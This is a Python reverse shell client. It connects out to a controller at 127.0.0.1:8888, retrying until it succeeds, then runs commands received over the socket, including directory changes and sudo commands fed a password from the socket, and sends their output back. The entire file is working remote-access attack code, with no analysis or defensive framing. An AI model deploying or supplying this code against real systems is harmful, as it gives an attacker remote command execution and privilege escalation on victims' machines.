#! /usr/bin/python3
import socket
import subprocess
import os
# socket connection Base
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# trying to connect Until Successfully Connected
print("Connecting....")
while True:
    try:
        s.connect(("127.0.0.1",8888))
        print("connected")
        break
    except ConnectionRefusedError:
        pass
# Command Execution
while True:
    cmd = (s.recv(8192)).decode()
    # If We Received cd Command This Will Executed
    if cmd[0:2]=="cd":
        try:
            newcmd = cmd.split()[1]
            os.chdir(newcmd)
            s.send(newcmd.encode())
        except Exception as e:
            # Handle any exceptions that occur during changing directory
            error_message = "An error occurred while changing directory: {}".format(e)
            s.send(error_message.encode())
    # Exit Functionality
    elif cmd == "exit":
        break
    # Sudo Command Functionality With Error Handling And Reporting
    elif cmd[0:4] == "sudo":
        try:
            r = s.recv(1024).decode()
            cmd2 = cmd.split()
            cmd2.insert(1, "-S")
            p = subprocess.run(cmd2, input=r, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            output = p.stdout
            if p.returncode == 0:
                if p.stdout.split():
                    s.send(output.encode())
                else:
                    s.send("No output".encode())
            elif p.returncode != 0:
                s.send(p.stderr.encode())
        # Handle any exceptions that occur during command execution
        except Exception as e:
            error_message = "An error occurred during command execution: {}".format(e)
            s.send(error_message.encode())
            continue
    else:
        # Other Functionality For Command Executive
        try:
            p = subprocess.run(cmd.split(),capture_output=True, text=True)
            output = p.stdout
            if p.returncode == 0:
                if p.stdout.split():
                    s.send(output.encode())
                else:
                    s.send("No output".encode())
            elif p.returncode != 0:
                s.send(p.stderr.encode())
        # Handle any exceptions that occur during command execution
        except Exception as e:
            error_message = "An error occurred during command execution: {}".format(e)
            s.send(error_message.encode())
# exits when receive a exit command
s.close()
print("Bye-Bye ^_^")